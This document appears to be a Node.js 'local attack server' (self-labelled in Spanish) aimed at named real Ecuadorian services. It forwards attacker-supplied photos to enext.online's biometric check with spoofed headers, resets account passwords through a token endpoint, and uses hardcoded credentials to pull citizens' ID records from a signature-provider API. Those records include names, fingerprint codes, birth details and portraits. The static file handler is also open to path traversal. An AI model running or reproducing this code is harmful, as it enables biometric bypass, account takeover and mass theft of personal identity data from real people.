#!/usr/bin/env node
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

const server = http.createServer((req, res) => {
  // 1. Servir los archivos estáticos de la interfaz
  if (req.method === 'GET' && !req.url.startsWith('/api/')) {
    let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : req.url);

    const extname = String(path.extname(filePath)).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html',
      '.js': 'text/javascript',
      '.css': 'text/css',
      '.json': 'application/json',
      '.png': 'image/png',
      '.jpg': 'image/jpg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml'
    };

    const contentType = mimeTypes[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
      if (error) {
        if(error.code == 'ENOENT') {
          res.writeHead(404, { 'Content-Type': 'text/html' });
          res.end('404 No Encontrado', 'utf-8');
        } else {
          res.writeHead(500);
          res.end('Error del Servidor: '+error.code+' ..\n');
          res.end();
        }
      } else {
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content, 'utf-8');
      }
    });
    return;
  }

  // 2. Endpoint API que recibe los datos de la interfaz y lanza el ataque
  if (req.method === 'POST' && req.url === '/api/attack') {
    let body = '';
    
    // Leer los datos enviados por la interfaz web
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const token = payload.token;
        const foto = payload.foto;

        if (!token || !foto) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan datos' }));
        }

        // Empaquetar como formulario HTTP (igual que el navegador original)
        const postData = new URLSearchParams({ foto: foto, token: token }).toString();

        // Armar la petición hacia el servidor real (Disfraz)
        const attackReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/biometrico.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': 'https://enext.online/factureroweb/public/biometria.php',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }, (attackRes) => {
          let attackData = '';
          attackRes.on('data', chunk => attackData += chunk);
          attackRes.on('end', () => {
            // Devolver el resultado a nuestra interfaz web
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              status: attackRes.statusCode,
              body: attackData
            }));
          });
        });

        attackReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        attackReq.write(postData);
        attackReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Error procesando JSON' }));
      }
    });
    return;
  }

  // 3. Endpoint para descargar una imagen externa y retornarla en Base64 (evita CORS)
  if (req.method === 'POST' && req.url === '/api/download-image') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const imageUrl = payload.url;
        if (!imageUrl) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Falta URL' }));
        }

        https.get(imageUrl, (imageRes) => {
          if (imageRes.statusCode !== 200) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Error descargando la imagen externa' }));
          }

          const chunks = [];
          imageRes.on('data', (chunk) => chunks.push(chunk));
          imageRes.on('end', () => {
            const buffer = Buffer.concat(chunks);
            const contentType = imageRes.headers['content-type'] || 'image/jpeg';
            const base64 = `data:${contentType};base64,${buffer.toString('base64')}`;

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ base64: base64 }));
          });
        }).on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON inválido' }));
      }
    });
    return;
  }

  // 4. Endpoint para enviar nueva contraseña a enext.online
  if (req.method === 'POST' && req.url === '/api/set-password') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const { token, newPass } = payload;

        if (!token || !newPass) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan campos token o newPass' }));
        }

        const postData = new URLSearchParams({ newPass, token }).toString();

        const passReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/actualzaPass.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': `https://enext.online/factureroweb/public/biometria.php?token=${token}`,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://enext.online',
            'Accept': '*/*'
          }
        }, (passRes) => {
          let passData = '';
          passRes.on('data', chunk => passData += chunk);
          passRes.on('end', () => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: passRes.statusCode, body: passData }));
          });
        });

        passReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        passReq.write(postData);
        passReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON inválido' }));
      }
    });
    return;
  }

  // Ruta no encontrada
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 SERVIDOR DE ATAQUE LOCAL INICIADO`);
  console.log(`👉 Abre tu navegador en: http://localhost:${PORT}`);
  console.log(`======================================================\n`);
  
  iniciarConsolaInteractiva();
});

// ========================================================================
// CONSULA INTERACTIVA EN TERMINAL
// ========================================================================
const readline = require('readline');

function iniciarConsolaInteractiva() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const preguntarCedula = () => {
    rl.question('🔍 Ingrese una cédula para consultar (o presione Ctrl+C para salir): ', async (cedula) => {
      if (cedula.trim() !== '') {
        await consultarCedulaTerminal(cedula.trim());
      }
      preguntarCedula();
    });
  };

  preguntarCedula();
}

async function consultarCedulaTerminal(cedula) {
  console.log(`\nObteniendo token de autenticación...`);
  try {
    const tokenData = await requestHttps({
      hostname: 'apifirmas.firmasecuador.com',
      path: '/api/auth/login',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*'
      }
    }, JSON.stringify({
      user: "1550239360",
      password: "Domenica99."
    }));

    if (!tokenData || !tokenData.token) {
      console.log('❌ Error: No se pudo obtener el token de autenticación.');
      return;
    }

    console.log(`✅ Token obtenido. Consultando datos para la cédula: ${cedula}...`);
    
    const cedulaData = await requestHttps({
      hostname: 'apifirmas.firmasecuador.com',
      path: '/api/usuarios/consultarCedula',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'x-token': tokenData.token
      }
    }, JSON.stringify({ cedula }));

    console.log(`\n=================== RESULTADO ===================`);
    if (cedulaData && cedulaData.identificacion) {
      console.log(`📌 Nombres: ${cedulaData.nombres || 'No disponible'}`);
      console.log(`📌 Identificación: ${cedulaData.identificacion}`);
      console.log(`📌 Código Dactilar: ${cedulaData.codigoDactilar || 'No disponible'}`);
      console.log(`📌 Lugar de Nacimiento: ${cedulaData.lugarNacimiento || 'No disponible'}`);
      console.log(`📌 Nacionalidad: ${cedulaData.nacionalidad || 'No disponible'}`);
      console.log(`📌 Género: ${cedulaData.genero || 'No disponible'}`);
      console.log(`📌 Estado Civil: ${cedulaData.estadoCivil || 'No disponible'}`);
      console.log(`📌 Fecha de Nacimiento: ${cedulaData.fechaNacimiento || 'No disponible'}`);
      console.log(`📌 RUC sugerido: ${cedulaData.identificacion}001`);
      if (cedulaData.foto) {
        console.log(`📸 Foto (Base64): ${cedulaData.foto.substring(0, 50)}... [truncado]`);
        try {
          const terminalImage = require('terminal-image').default;
          const base64Data = cedulaData.foto.replace(/^data:image\/\w+;base64,/, "");
          const buffer = Buffer.from(base64Data, 'base64');
          console.log('\nRetrato del ciudadano:');
          const renderedImage = await terminalImage.buffer(buffer, {width: 40});
          console.log(renderedImage);
        } catch (imgErr) {
          console.log(`❌ No se pudo dibujar la imagen en la terminal: ${imgErr.message}`);
        }
      }
    } else {
      console.log(`❌ No se encontraron datos válidos o la API devolvió error.`);
      if (cedulaData) console.log(cedulaData);
    }
    console.log(`=================================================\n`);

  } catch (error) {
    console.log(`❌ Ocurrió un error en la consulta: ${error.message}\n`);
  }
}

function requestHttps(options, postData) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve(data); // Return as string if not JSON
        }
      });
    });

    req.on('error', (e) => reject(e));
    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}
